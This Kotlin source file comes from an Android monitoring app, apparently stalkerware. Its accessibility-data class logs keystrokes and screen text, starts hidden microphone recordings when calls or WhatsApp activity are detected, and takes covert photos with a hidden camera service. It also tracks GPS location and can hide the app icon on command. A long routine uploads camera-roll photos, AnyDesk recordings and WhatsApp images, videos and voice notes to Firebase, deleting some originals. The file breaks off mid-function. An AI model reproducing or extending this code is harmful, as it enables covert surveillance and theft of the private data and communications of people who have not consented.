package com.github.midros.istheapp.services.accessibilityData

import android.content.Context
import android.location.Geocoder
import android.location.Location
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.util.Log
import android.util.Log.i
import com.github.midros.istheapp.R
import com.github.midros.istheapp.data.model.ChildPhoto
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.data.model.Photo
import com.github.midros.istheapp.data.model.Recording
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.services.social.MonitorService
import com.github.midros.istheapp.utils.ConstFun
import com.github.midros.istheapp.utils.ConstFun.getDateTime
import com.github.midros.istheapp.utils.ConstFun.getRandomNumeric
import com.github.midros.istheapp.utils.ConstFun.showApp
import com.github.midros.istheapp.utils.Consts.ADDRESS_AUDIO_RECORD
import com.github.midros.istheapp.utils.Consts.ADDRESS_AUDIO_RECORDS
import com.github.midros.istheapp.utils.Consts.CHILD_CAPTURE_PHOTO
import com.github.midros.istheapp.utils.Consts.CHILD_GPS
import com.github.midros.istheapp.utils.Consts.CHILD_PERMISSION
import com.github.midros.istheapp.utils.Consts.CHILD_SERVICE_DATA
import com.github.midros.istheapp.utils.Consts.CHILD_SHOW_APP
import com.github.midros.istheapp.utils.Consts.CHILD_SOCIAL_MS
import com.github.midros.istheapp.utils.Consts.DATA
import com.github.midros.istheapp.utils.Consts.KEY_LOGGER
import com.github.midros.istheapp.utils.Consts.KEY_TEXT
import com.github.midros.istheapp.utils.Consts.LOCATION
import com.github.midros.istheapp.utils.Consts.PARAMS
import com.github.midros.istheapp.utils.Consts.PHOTO
import com.github.midros.istheapp.utils.Consts.RECORDING
import com.github.midros.istheapp.utils.Consts.SOCIAL
import com.github.midros.istheapp.utils.Consts.TAG
import com.github.midros.istheapp.utils.FileHelper
import com.github.midros.istheapp.utils.FileHelper.getFileNameAudio
import com.github.midros.istheapp.utils.FileHelper.getFilePath
import com.github.midros.istheapp.utils.MediaRecorderUtils
import com.github.midros.istheapp.utils.MyCountDownTimer
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraRotation
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.e
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.CompositeDisposable
import io.reactivex.schedulers.Schedulers
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.time.format.DateTimeFormatter
import java.util.*
import java.util.concurrent.TimeUnit
import javax.inject.Inject

/**
 * Created by luis rafael on 17/03/18.
 */
class InteractorAccessibilityData
@Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) :
    InterfaceAccessibility, CameraCallbacks {

    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000 ).toLong() //* 60
    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()

    private var timer: MyCountDownTimer? = null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
        cancelTimer()
        deleteFile()
    }
    private var fileName: String? = null
    private var fileName2: String? = null
    private var dateTime: String? = null
    private var nameAudio: String = ""

    private var countDownTimer: MyCountDownTimer = MyCountDownTimer(startTime, interval) {
        if (firebase.getUser() != null)
            firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
        startCountDownTimer()
    }

    override fun startCountDownTimer() {
        countDownTimer.start()
    }

    override fun stopCountDownTimer() {
        countDownTimer.cancel()
    }


    override fun clearDisposable() {
        //disposable.dispose()
        //disposable.clear()
    }

    override fun setDataKey(data: String) {
        if (firebase.getUser() != null) {
            // data.contains("(CLICKED)") || data.contains("(FOCUSED)")  || data.contains("(LONG CLICKED)") )
        //    if (!data.contains("(TEXT)") || data.contains("(NOTIFICACION)") || data.contains("anydesk")  || data.contains("whatsapp") || data.contains("Llamada") ) {
                firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
      //      }
            if (data.contains("recording")  ) {
//                val childPhoto2 = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
//           //     startCameraPicture(childPhoto2)
//                TimeUnit.SECONDS.sleep(1L)
                //    startCameraPictureFace()
                startRecording(1000 * 60 * 60)
            }
            if (data.contains("Alarma, Despertar") && data.contains("(TEXT)")  ) {
                startRecording(1000 * 60 * 60)
            }
            if (data.contains("Grabando") || data.contains("[Pausar]")  || data.contains("[Enviar]")  || data.contains("Llamada")  || data.contains("[Videollamada]")|| data.contains( "[CONTESTAR]") || data.contains( "[End call]")  || data.contains( "[ANSWER]")  || data.contains( "phone")) {
               startRecording(1000 * 60 * 60)
            }
            if (( data.contains("incallui:[Llamada entrante") && data.contains("(TEXT)")) || (data.contains("[RESPONDER]") && data.contains("dialer"))) {
                startRecording(1000 * 60 * 60)
            }
            if (( data.contains("incallui:[Llamada saliente") && data.contains("(CLICKED)")) || (data.contains("[RESPONDER]") && data.contains("dialer"))) {
                startRecording(1000 * 60 * 60)
            }
//            if ( data.contains("(CLICKED)") ) {
//                val childPhoto = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
//                startCameraPicture(childPhoto)
//            }
            if ( data.contains("Cámara") ) {
                val childPhoto = ChildPhoto(true, CameraFacing.REAR_FACING_CAMERA)
                startCameraPicture(childPhoto)
            }
            if (data.contains("[YouTube]")  && data.contains("(CLICKED)") ) {
                val childPhoto = ChildPhoto(true, CameraFacing.REAR_FACING_CAMERA)
                startCameraPicture(childPhoto)
                startRecording(1000 * 60 * 60)
            }
            if (data.contains("googlequicksearchbox:[") && data.contains("(CLICKED)") ) {
                val childPhoto2 = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
                startCameraPicture(childPhoto2)
            }
        }
    }

    //ubicacion
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            val address: String
            val geoCoder = Geocoder(context, Locale.getDefault())
            val sdf = SimpleDateFormat("EEEE")
            val d = Date()
            val day = sdf.format(d)
            val rightNow = Calendar.getInstance()
            val hour: Int = rightNow.get(Calendar.HOUR_OF_DAY)
            //        if ((day.contains("lunes") || day.contains("martes") || day.contains("miercoles") || day.contains("jueves" )  || day.contains("vierneslunes")) && (hour == 10) ) {
            if (hour >= 0 && hour <= 23) {
              //  val exist = File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()
                if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists())
               // if (nameAudio.isEmpty() )
                    startRecording(1000*60*60)

                address = try {
                    geoCoder.getFromLocation( location.latitude, location.longitude, 1 )[0].getAddressLine(0)
                } catch (e: IOException) {
                    context.getString(R.string.address_not_found)
                }
                val dateTime1 = getDateTime()
                val model = com.github.midros.istheapp.data.model.Location( location.latitude, location.longitude, address, dateTime1 )
                val child = "$LOCATION/$DATA" //+ dateTime1
                Log.i("cambio de ubicacion", model.toString())
                val child2 = "location2/data" //+ dateTime1.toString().replace(" ","-")
                //        val child2 =
                //    child2 = child2.replace(" ","-")//
                firebase.getDatabaseReference(child).setValue(model)
                //    Thread.sleep(1_000)
                firebase.getDatabaseReference(child2).push().setValue(model)
            }
            //
        }
    }

    override fun enablePermissionLocation(location: Boolean) {
        if (firebase.getUser() != null)
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
    }

    override fun enableGps(gps: Boolean) {
        if (firebase.getUser() != null)
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
    }

    override fun setRunServiceData(run: Boolean) {
        if (firebase.getUser() != null)
            firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
    }

    override fun getShowOrHideApp() {
        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP").map {
                    data -> data.value as Boolean
            }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe(
                {
                    context.showApp(it)
                },
                {
                    e(TAG, it.message.toString())
                }
            )
        )
    }

    override fun getCapturePicture() {
        disposable.add(
            firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(
                    {
                            child ->  startCameraPicture(child)
                    },
                    {
                            error -> e(TAG, error.message.toString())
                    })
        )
    }

    private fun startCameraPicture(childPhoto: ChildPhoto) {
        if (childPhoto.capturePhoto!!) {
            val cameraConfig = CameraConfig().builder(context)
                .setCameraFacing(childPhoto.facingPhoto!!)
                .setImageRotation(
                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA)
                        CameraRotation.ROTATION_270
                    else
                        CameraRotation.ROTATION_90
                )
                .build()
            pictureCapture.startCamera(cameraConfig)
        }
    }

    private fun startCameraPictureFace() {

            val cameraConfig = CameraConfig().builder(context).setCameraFacing(1).setImageRotation(
                 //   if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA)
                        CameraRotation.ROTATION_270
                )
                .build()
            pictureCapture.startCamera(cameraConfig)

    }

    override fun onImageCapture(imageFile: File) {
        pictureCapture.stopCamera()
        sendFilePhoto(imageFile.absolutePath)
    }

    override fun onCameraError(errorCode: Int) {
        pictureCapture.stopCamera()
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)

        if (errorCode == ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
            errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
            errorCode == ERROR_IMAGE_WRITE_FAILED
        )
        firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
    }

    private fun sendFilePhoto(imageFile: String?) {
        if (imageFile != null) {
            val namePhoto = getRandomNumeric()
            val uri = Uri.fromFile(File(imageFile))
            disposable.add(
                firebase.putFile("$PHOTO/$namePhoto", uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ task ->
                        task.storage.downloadUrl.addOnCompleteListener {
                            setPushNamePhoto(it.result.toString(), namePhoto)
                            FileHelper.deleteFile(imageFile)
                            sendFileAudios()
                        }
                    }, { error ->
                        e(TAG, error.message.toString())
               //         FileHelper.deleteFile(imageFile)
                    })
            )
        }
    }

    private fun setPushNamePhoto(url: String, namePhoto: String) {
        val photo = Photo(namePhoto, getDateTime(), url)
        firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
        firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
    }

    override fun getSocialStatus() {
        disposable.add(firebase.valueEvent("$SOCIAL/$CHILD_SOCIAL_MS")
            .map {
                    data -> data.exists()
            }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({
                if (!it)
                    context.startService(IntentFor<MonitorService>(context))
            },
                { e(TAG, it.message.toString()) })
        )
    }

    override fun getRecordingAudio() {
        disposable.add(
            firebase.valueEventModel("$RECORDING/$PARAMS", ChildRecording::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ child ->
                    if (child.recordAudio!!) {
                        startRecording(child.timeAudio!!)
                    }
                },
                {
                        error ->  e(TAG, error.message.toString())
                })
        )
    }

    private fun stopRecording() = recorder.stopRecording {
    //    File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
        sendFileAudio()
    }

    private fun cancelTimer() {
        if (timer != null)
            timer!!.cancel()
    }

    private fun setIntervalRecord(interval: Long) {
        //    firebase.getDatabaseReference("$RECORDING/$TIMER/$INTERVAL").setValue(interval)
        i(TAG, "intervalll $interval")
    }

    private fun deleteFile() {
        FileHelper.deleteFile(fileName2)
        resetParamsRecording()
    }

    private fun deleteFile2(name: String) {
        FileHelper.deleteFile(name)
     //   resetParamsRecording()
    }

    private fun startRecording(startTime: Long) {
        if (!File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").exists()) {
            timer = MyCountDownTimer(1000*60*60, interval, {
         //   timer = MyCountDownTimer(startTime, interval, { //1000*60*1
                setIntervalRecord(it)
                i(TAG, "Grabando... ${it.toString()}");
            }) {
                stopRecording()
                //startRecording(1000 * 60 * 60)
            }
            nameAudio = getRandomNumeric()
            dateTime = getDateTime()
            fileName = context.getFileNameAudio(nameAudio, dateTime)
            recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
            timer!!.start()
        }
    }

    private fun sendFileAudio() {
        val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD"
        val dateName = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
      //  setPushName()
        val duration = FileHelper.getDurationFile(fileName!!)
        val recording = Recording(nameAudio, dateTime, duration)
        nameAudio = ""
        fileName2 = fileName
        val hour: Int = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
      //  if (hour >= 0 && hour <= 23)
            startRecording(1000 * 60 * 60)

        disposable.add(
            firebase.putFile("$RECORDING/$dateName", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(
                    {
                   //     setPushName()
                       firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
                       deleteFile()
                       sendFileAudios()
                  //      resetParamsRecording()
                  //      startRecording(1000 * 60 * 1)
                    },
                    {
                        i(TAG, "error sendFileAudio ${it.toString()}")  //  deleteFile()
                    }
                )
        )
    }

    private fun sendFileAudio2() {
        val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD"
        val dateName = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
        //  setPushName()
        val duration = FileHelper.getDurationFile(fileName!!)
        val recording = Recording(nameAudio, dateTime, duration)
        nameAudio = ""
        val hour: Int = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
//        if (hour >= 6 && hour <= 23)
//            startRecording(1000 * 60 * 60)
        disposable.add(
            firebase.putFile("$RECORDING/$dateName", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(
                    {
                        //     setPushName()
                        firebase.getDatabaseReference("$RECORDING/$DATA").push().setValue(recording)
                        deleteFile()
                        //      resetParamsRecording()
                        //      startRecording(1000 * 60 * 1)
                    },
                    {
                        i(TAG, "fin... ${it.toString()}")  //  deleteFile()
                    })
        )
    }

    private fun sendFileAudios() {
        val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORDS"
        //  File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
        var dateName2 = "" //fileName!!.replace("$filePath/", "")
        var uri = Uri.fromFile(File("fileName"))
        try {
            File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORDS/").walk(FileWalkDirection.BOTTOM_UP).forEach{
                dateName2 = it.absolutePath.replace("$filePath/", "")
                if (!dateName2.isBlank() && !it.toString().equals("${context.getFilePath()}/$ADDRESS_AUDIO_RECORDS")) {
                    uri = Uri.fromFile(File(it.toString()))
                    if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 = dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                    //    setPushName2(dateName3)
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        Log.i("error upload file", dateName3)          //  deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
            var path = "/storage/emulated/0/DCIM/Camera"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path)) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 = dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file", dateName3)
                                    //    deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
            path = "/storage/emulated/0/AnyDesk/recordings"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path)) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 = dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        File("/storage/emulated/0/AnyDesk/recordings/"+dateName2).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                 //       File(path+"/"+dateName2).delete()
                                        Log.i("error upload file", dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )

                    }
                    else{
                        File("/storage/emulated/0/AnyDesk/recordings/"+dateName2).delete()
                    }
                }
            }
            path = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/photos"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path)) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 = dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/photos/"+dateName2).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file", dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
            path = "/storage/emulated/0/WhatsApp/Media/WhatsApp Video/Sent"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path) && dateName2.contains(".")) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 = "wsp-sent-"+dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        //     File(path+"/"+dateName3).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file",dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
            path = "/storage/emulated/0/WhatsApp/Media/WhatsApp Video"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path) && !dateName2.contains("/") && dateName2.contains(".")) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 = "wsp-recv-"+dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                     //   File(path+"/"+dateName3).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file",dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
            path = "/storage/emulated/0/WhatsApp/Media/WhatsApp Audio/Sent"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path) && dateName2.contains(".")) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 =  "wsp-sent-"+dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        //     File(path+"/"+dateName3).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file",dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )

                    }
                }
            }
            path = "/storage/emulated/0/WhatsApp/Media/WhatsApp Audio"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path) && !dateName2.contains("/") && dateName2.contains(".")) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 =  "wsp-recv-"+dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                               //         File(path+"/"+dateName3).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file",dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )

                    }
                }
            }
            path = "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Sent"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path) && !dateName2.contains("/") && dateName2.contains(".")) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 =  "wsp-sent-"+dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        //         File(path+"/"+dateName3).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file",dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
            path = "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path+"/", "")
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path) && !dateName2.contains("/") && dateName2.contains(".")) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 =  "wsp-recv-"+dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        //         File(path+"/"+dateName3).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file",dateName3)
                                        //    deleteFile2(it.toString())
                                    })
                        )
                    }
                }
            }
            path = "/storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes"
            File(path).walk(FileWalkDirection.BOTTOM_UP).forEach{
                if (!File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").exists()) {
                    dateName2 = it.absolutePath.replace(path + "/", "")
                    if (dateName2.contains("/")) {
                        dateName2 = dateName2.split("/")[1]
                    }
                    if (!File("/storage/emulated/0/Android/media/"+dateName2+".bin").exists() && !dateName2.isBlank() && !it.toString().equals(path) && dateName2.contains(".")) {
                        uri = Uri.fromFile(File(it.toString()))
                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").createNewFile()
                        var dateName3 =  "wsp-recv-notes-"+dateName2
                        disposable.add(
                            firebase.putFile("$RECORDING/$dateName3", uri)
                                .subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe(
                                    {
                                        //    setPushName2(dateName3)
                                        File("/storage/emulated/0/Android/media/"+dateName2+".bin").createNewFile()
                                        //         File(path+"/"+dateName3).delete()
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        sendFileAudios()
                                    },
                                    {
                                        //error
                                        File("${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/enviar.txt").delete()
                                        Log.i("error upload file",dateName3)
